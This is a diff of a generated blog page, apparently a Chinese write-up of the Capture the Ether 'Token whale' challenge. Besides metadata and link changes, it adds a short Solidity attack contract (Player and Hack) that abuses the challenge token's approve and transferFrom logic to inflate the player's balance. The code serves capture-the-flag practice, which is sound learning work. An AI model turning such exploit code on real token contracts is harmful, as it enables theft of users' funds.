@@ -1794,7 +1794,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1690522141791),
+    lastupdate: new Date(1692682587051),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","qrcode"],
       for_post: ["toc","blogger","qrcode"],
@@ -2995,7 +2995,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：1.3k 字</p>
+      <p>字数：1.4k 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
@@ -3103,6 +3103,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li><p><img src="https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020019243.png" alt="image-20230414141425469"></p>
 </li>
 </ul>
+<p><em><strong>一段时间之后的二刷</strong></em></p>
+<p><strong>攻击合约</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">    攻击思路:</span><br><span class="line">        1. 部署Player，部署challenge，部署Hack</span><br><span class="line">        2. 调用 player 的attack，给hacker授权</span><br><span class="line">        3. 调用Hack的attack，完成攻击</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">contract Player &#123;</span><br><span class="line">    </span><br><span class="line">    function attack(address spender, uint256 value, TokenWhaleChallenge challenge) public &#123;</span><br><span class="line">        challenge.approve(spender, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line"></span><br><span class="line">    TokenWhaleChallenge challenge;</span><br><span class="line"></span><br><span class="line">    function Hack(address _challenge) public &#123;</span><br><span class="line">        challenge = TokenWhaleChallenge(_challenge);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address player) public &#123;</span><br><span class="line">        challenge.transferFrom(player, player, 1000);</span><br><span class="line">        challenge.transfer(player, 1000000);</span><br><span class="line">        require(challenge.isComplete());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
   </div>
   
@@ -3212,10 +3216,10 @@ This retirement fund is what economists call a commitment device. I’m ...</p>
         </a>
       
       
-        <a class='next' href='/2023/04/12/Solidity/Basic_Knowledge/solidity%E7%9A%84%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/'>
-          <p class='title'>solidity的整数溢出<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>solidity的整数溢出资料收集中：文章一
-</p>
+        <a class='next' href='/2023/04/12/Smart%20contracts/capther%20the%20ether/Token%20sale/'>
+          <p class='title'>Token sale<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>Token sale1. 题目
+1.1 This token contract allows you to buy and sell tokens at an even exchange rat...</p>
         </a>
       
     </div>
